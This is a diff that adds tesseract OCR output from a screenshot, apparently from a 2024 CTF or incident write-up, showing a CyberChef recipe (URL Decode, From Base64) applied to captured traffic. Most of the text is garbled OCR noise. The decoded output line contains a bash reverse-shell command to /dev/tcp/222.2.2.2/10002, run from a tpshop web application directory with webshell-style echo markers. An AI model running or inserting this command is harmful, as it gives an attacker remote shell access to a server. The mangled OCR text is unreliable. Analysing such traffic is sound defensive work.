@@ -1,0 +1,21 @@
+# OCR: 63755c64a0e898182e2bf951e5c41c9b.jpg
+# 来源: .\02-WriteUp\2024\63755c64a0e898182e2bf951e5c41c9b.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:31
+
+Recipe
+‘URL Decode
+From Base64
+A-Za-20-9+/=
+Di swice mode
+日 东 目
+ou
+eu
+A Remove non-alphabet chars
+Input 十 口 口 目 西
+enooeoeicutossueoenecoseounuiotruciuracicxneeetiityujiutssesnctzioooeo
+jecpeypoeetneoeraetenum
+二 Fi hemes ou
+日 厂 四 5
+cd “/im/iasuroot nen. tpshop.com/ application” bash -1>8 /dev/tcp/222.2.2.2/10002 >&A;echo 9f744;pudsecho dea7Saf74319,
+Output
